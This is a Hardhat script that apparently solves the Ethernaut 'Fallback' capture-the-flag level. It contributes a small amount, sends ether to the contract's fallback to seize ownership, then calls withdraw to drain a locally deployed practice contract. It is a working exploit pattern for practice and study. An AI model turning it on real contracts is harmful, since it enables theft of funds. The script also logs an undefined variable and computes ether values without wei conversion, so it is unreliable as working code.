import { ethers } from "hardhat";

async function main(){
    // random player address
    let player = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
    // fallback contract address
    let address_a = "0x5fbdb2315678afecb367f032d93f642f64180aa3";

    // simple stage, send a small amount of ether to become owner
    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Fallback", address_a, signer);

    await contract_a.contribute({
        value: 0.000001 * 10**8
    });

    let options = {
        to: address_a,
        value: 0.0001 * 10**8
    };

    let temp1 = await signer.sendTransaction(options);
    console.log(temp1);

    // verify we are owner
    let owner = await contract_a.owner();
    console.log(who_is);

    await contract_a.withdraw();
    // check contract_a is drained
    let balance = await ethers.provider.getBalance(address_a);
    console.log(balance);


}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
